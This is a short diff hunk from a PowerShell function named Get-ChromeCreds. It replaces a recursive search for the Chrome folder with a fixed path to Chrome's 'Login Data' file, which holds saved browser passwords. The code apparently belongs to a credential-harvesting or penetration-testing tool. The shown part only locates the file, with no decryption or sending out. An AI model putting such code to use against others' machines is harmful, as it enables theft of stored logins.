@@ -11,14 +11,7 @@ function Get-ChromeCreds() {
 	)
 
 	if ([String]::IsNullOrEmpty($Path)) {
-		# Force to show hidden files/directories
-		$chromePath = (Get-ChildItem -Directory -Recurse -Path ($env:USERPROFILE) -Force -ErrorAction SilentlyContinue `
-			| Where-Object { $_.BaseName -ceq 'Chrome' }).FullName
-
-		if (![string]::IsNullOrEmpty($chromePath))
-		{
-			$Path = [System.IO.Path]::Combine($chromePath, 'User Data\Default\Login Data')
-		}
+		$Path = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"
 	}
 
 	if (![system.io.file]::Exists($Path))
